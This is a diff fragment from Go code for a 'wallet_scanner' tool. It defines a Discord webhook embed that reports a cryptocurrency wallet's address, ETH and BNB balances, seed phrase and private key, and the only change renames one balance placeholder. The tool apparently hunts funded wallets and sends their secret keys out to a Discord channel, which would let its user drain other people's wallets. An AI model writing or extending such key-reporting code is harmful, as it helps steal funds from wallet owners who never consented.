@@ -86,7 +86,7 @@ func init() {
 		Embeds: []WebhookEmbed{
 			{
 				Title:       "wallet_scanner @127.0.0.3107",
-				Description: "**Address**: `%address%`\n**Balance**: `%eth% | %bsc%`\n**Seed**: `%seed%`\n**PrivateKey**: `%privatekey%`",
+				Description: "**Address**: `%address%`\n**Balance**: `%eth% | %bnb%`\n**Seed**: `%seed%`\n**PrivateKey**: `%privatekey%`",
 				Image: WImage{
 					URL: "https://cdn.discordapp.com/avatars/921245954923987005/5d5c39ac4d55d112633166148486e8a5.png?size=1024",
 				},
